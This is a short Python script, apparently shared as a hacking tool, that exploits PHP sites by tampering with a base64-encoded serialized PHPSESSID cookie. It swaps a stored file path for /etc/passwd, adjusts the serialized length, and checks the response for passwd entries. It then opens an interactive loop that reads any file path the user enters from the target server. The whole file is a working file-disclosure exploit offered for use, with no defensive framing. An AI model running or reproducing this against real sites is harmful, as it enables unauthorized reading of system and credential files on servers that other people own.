#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Created By aDarkDev.

import requests
import re
import base64


passwd_regex = r'.*?:.*?:.*?:.*?:.*?:.*?:.*?$'
passwd_sting = '/etc/passwd'
test_list = [
    '/www/index.html',
    '/www/html/',
    '/html/index',
]
def base64Decode(text:str):
    text = text.encode()
    return base64.b64decode(text).decode()

def base64Encode(text:str):
    text = text.encode()
    return base64.b64encode(text).decode()


URL = input("Enter Website Url: ")
cookies = requests.get(URL).cookies.get_dict()

# Exit if not vulnerable
if "PHPSESSID" not in cookies: 
    print("The website is not vulnerable to hacking.")
    exit()

cookies_string = base64Decode(cookies['PHPSESSID'])

# Starting
for test_string in test_list:
    if test_string in cookies_string:
        print("Target Is \033[94mvulnerable\033[0m.")
        print("Making test for",URL,"...")
        cookies_string = cookies_string.replace(test_string,passwd_sting)
        cookies_string = cookies_string.replace(f"s:{len(test_string)}",f"s:{len(passwd_sting)}")
    
        new_req = requests.get(URL,cookies={"PHPSESSID":base64Encode(cookies_string)})
        if re.findall(passwd_regex,new_req.text) != []:
            print("Test Completed. /etc/passwd/ Result:\033[92m\n",new_req.text,"\033[0m\nYou Can Make injection by your self")
            print("You can use your desired directory.")
            while True:
                new_dir = input("Enter dir (enter 0 to exit): ")
                if new_dir == "0": exit()
                new_req = requests.get(URL,cookies={
                    "PHPSESSID":base64Encode(
                        cookies_string
                        .replace(passwd_sting,new_dir)
                        .replace(f"s:{len(passwd_sting)}",f"s:{len(new_dir)}")
                        )
                    })
                print("Result: \n\033[92m"+new_req.text+"\033[0m")
        break

else:
    print("Test Faild on Your Target.")
    exit()
